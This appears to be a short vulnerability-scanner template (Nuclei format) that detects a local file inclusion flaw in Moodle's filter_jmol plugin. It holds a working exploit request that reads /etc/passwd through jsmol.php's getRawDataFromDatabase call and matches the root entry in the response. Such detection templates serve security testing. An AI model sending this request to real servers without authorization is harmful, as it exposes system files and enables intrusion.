id: moodle-filter-jmol-lfi
info:
  author: madrobot
  name: Moodle filter_jmol LFI
  severity: high
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd'
